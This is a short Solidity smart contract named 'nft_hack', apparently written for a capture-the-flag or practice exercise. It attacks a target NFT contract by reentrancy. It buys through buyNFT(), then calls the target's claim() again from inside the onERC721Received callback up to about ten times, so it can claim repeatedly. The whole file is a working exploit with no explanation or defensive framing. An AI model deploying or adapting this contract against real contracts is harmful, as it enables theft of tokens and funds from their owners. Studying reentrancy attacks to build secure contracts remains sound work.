// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract nft_hack{

    address public target;
    uint8 public counter;

    constructor(address _target){
        target = _target;
        counter=0;
    }

    function setTarget(address _target)external{
        target= _target;
    }
    function buy() external payable {
        target.call{value: msg.value}(abi.encodeWithSignature("buyNFT()"));
    }

    function claim() external {
        target.call(abi.encodeWithSignature("claim()"));
    }
    function onERC721Received(
        address, 
        address, 
        uint256, 
        bytes calldata
    )external returns(bytes4) {
        // target.call(abi.encodeWithSignature("balanceOf(address)",addr));
        counter+=1;
        
        if(counter>10){
            return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
        }
        target.call(abi.encodeWithSignature("claim()"));    
        counter+=1;
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    } 

}
